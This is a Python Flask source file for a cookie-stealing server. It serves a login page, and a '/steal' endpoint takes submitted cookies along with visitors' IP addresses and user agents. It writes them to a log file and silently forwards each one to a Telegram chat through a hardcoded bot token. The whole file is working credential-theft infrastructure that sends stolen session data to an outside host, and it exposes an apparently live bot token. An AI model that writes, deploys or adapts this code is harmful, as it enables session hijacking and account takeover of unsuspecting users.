from flask import Flask, request, render_template
import os
from datetime import datetime
import requests

app = Flask(__name__)

BOT_TOKEN = "7599021313:AAFmH8Ch1-KypyK0Ez2Ot-hYQ8TS7vcGLmE"
CHAT_ID = "6908281054"

LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": msg
    }
    try:
        requests.post(url, data=payload)
    except:
        pass  # Silent fail

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/steal', methods=['POST'])
def steal():
    cookie = request.form.get('cookie')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now()

    log = f"[{timestamp}] IP: {ip}\nUA: {user_agent}\nCookie: {cookie}\n{'='*40}\n"

    with open(os.path.join(LOG_DIR, 'cookies.txt'), 'a') as f:
        f.write(log)

    # Send Telegram Alert
    tg_message = f"🕵️‍♂️ New Visit Detected!\n📅 {timestamp}\n🌐 IP: {ip}\n🧭 UA: {user_agent}\n🍪 Cookie: {cookie}"
    send_telegram(tg_message)

    return "", 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
